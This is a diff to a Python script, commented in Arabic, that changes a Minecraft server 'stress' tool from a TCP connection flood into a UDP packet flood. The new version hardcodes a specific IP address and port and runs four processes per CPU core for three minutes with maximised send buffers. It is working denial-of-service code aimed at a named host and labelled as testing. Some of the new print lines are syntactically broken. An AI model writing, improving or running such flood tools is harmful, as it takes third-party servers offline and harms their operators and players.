@@ -3,39 +3,39 @@ import time
 from multiprocessing import Process, cpu_count
 
 # ==========================================
-# إعدادات الهدف (سيرفر ماين كرافت)
+# إعدادات الهدف والأداء الأقصى (UDP)
 # ==========================================
-TARGET_IP = ""  # ضع آيباد سيرفر ماين كرافت هنا
-TARGET_PORT = 56           # منفذ ماين كرافت الافتراضي
-DURATION = 30                 # مدة التشغيل بالثواني
-SOCKETS_PER_WORKER = 20       # عدد اتصالات TCP المفتوحة في كل عملية
+TARGET_IP = "193.233.114.200"
+TARGET_PORT = 19134
+DURATION = 180          # مدة التشغيل بالثواني قبل التوقف التام
+SOCKETS_PER_WORKER = 10 # عدد المقابس لكل عملية لتسريع الضخ
 
-def mc_stress_worker(ip, port, duration):
+def udp_stress_worker(ip, port, duration):
     end_time = time.time() + duration
     
-    while time.time() < end_time:
-        active_sockets = []
-        
-        # فتح اتصالات TCP متعددة بشكل متزامن
-        for _ in range(SOCKETS_PER_WORKER):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.setblocking(False)
-                s.connect_ex((ip, port))
-                active_sockets.append(s)
-            except Exception:
-                pass
-                
-        # إرسال بيانات وهمية متتالية لإشغال المقابس وإرهاق المعالج
-        dummy_data = b"\xfe\x01\xfa" * 10
-        while time.time() < end_time and active_sockets:
-            for s in list(active_sockets):
-                try:
-                    s.send(dummy_data)
-                except Exception:
-                    active_sockets.remove(s)
-                    
-        # إغلاق المقابس عند انتهاء الدورة لتجديد الاتصالات
+    # إنشاء مصفوفة مقابس (Sockets) خاصة بهذه العملية لتجنب التأخير
+    active_sockets = []
+    for _ in range(SOCKETS_PER_WORKER):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            # رفع حجم المخزن المؤقت للشبكة للحد الأقصى
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)
+        except Exception:
+            pass
+        active_sockets.append(sock)
+    
+    # حمولة بيانات عشوائية تحاكي ضغط الحزم الموجهة للبروتوكول
+    payload = b"\x01\x00\x00\x00\x00\x00\x00\x00" * 16
+    
+    # حلقة إرسال فائقة السرعة بدون توقف حتى انتهاء الوقت المحدد
+    try:
+        while time.time() < end_time:
+            for s in active_sockets:
+                for _ in range(50): # دفعات متتالية في كل دورة
+                    s.sendto(payload, (ip, port))
+    except Exception:
+        pass
+    finally:
         for s in active_sockets:
             try:
                 s.close()
@@ -43,20 +43,24 @@ def mc_stress_worker(ip, port, duration):
                 pass
 
 def main():
-    # مضاعفة العمليات بناءً على طاقة معالج الجهاز
+    # استغلال كامل طاقة المعالج عبر مضاعفة العمليات
     workers = cpu_count() * 4
-    print(f"[*] بدء ضغط TCP على سيرفر ماين كرافت {TARGET_IP}:{TARGET_PORT} بـ {workers} عملية متوازية...")
+    print([*] تم إطلاق محرك ضغط UDP بـ {workers} عملية متوازية.)
+    print([*] الهدف المستهدف: {TARGET_IP}:{TARGET_PORT} | المدة: {DURATION} ثانية.)
     
     processes = []
+    
+    # تشغيل العمليات بالتوازي
     for _ in range(workers):
-        p = Process(target=mc_stress_worker, args=(TARGET_IP, TARGET_PORT, DURATION))
+        p = Process(target=udp_stress_worker, args=(TARGET_IP, TARGET_PORT, DURATION))
         processes.append(p)
         p.start()
         
+    # الانتظار حتى انتهاء الوقت المحدد وتوقف العمليات تلقائياً
     for p in processes:
         p.join()
         
-    print("[*] انتهى وقت الاختبار وتوقف إرسال الطلبات.")
+    print("[*] انتهى الوقت المحدد! توقف إرسال الحزم بالكامل.")
 
 if __name__ == '__main__':
     main()
